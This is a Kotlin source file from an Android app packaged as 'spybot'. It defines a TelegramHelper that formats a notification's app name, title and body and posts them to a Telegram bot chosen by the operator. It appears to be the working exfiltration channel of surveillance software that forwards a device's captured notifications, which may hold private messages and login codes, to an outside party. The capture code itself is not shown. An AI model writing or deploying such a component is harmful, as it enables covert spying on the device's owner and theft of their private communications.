package com.example.spybot.helper

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Toast
import com.example.spybot.AppPreferences
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit

object TelegramHelper {

    private const val TAG = "TELEGRAM_HELPER"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()

    fun sendNotification(context: Context, title: String, body: String, appName: String) {
        val token = AppPreferences.getToken(context) ?: ""
        val chatId = AppPreferences.getChatId(context) ?: ""

        if (token.isEmpty() || chatId.isEmpty()) {
            Log.e(TAG, "Token ya Chat ID missing hai Settings me!")
            return
        }

        // Special HTML characters ko escape karna taaki Telegram reject na kare
        val safeApp = escapeHtml(appName)
        val safeTitle = escapeHtml(title)
        val safeBody = escapeHtml(body)

        val messageText = "<b>App:</b> $safeApp\n<b>Title:</b> $safeTitle\n<b>Body:</b> $safeBody"

        val formBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", messageText)
            .add("parse_mode", "HTML")
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendMessage")
            .post(formBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Network Call Failed: ${e.message}")
            }

            override fun onResponse(call: Call, response: Response) {
                val responseBody = response.body?.string() ?: ""
                if (response.isSuccessful) {
                    Log.d(TAG, "Message sent successfully to Telegram!")
                } else {
                    Log.e(TAG, "Telegram API Error [${response.code}]: $responseBody")
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, "Telegram Error: ${response.code}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        })
    }

    private fun escapeHtml(text: String): String {
        return text.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }
}
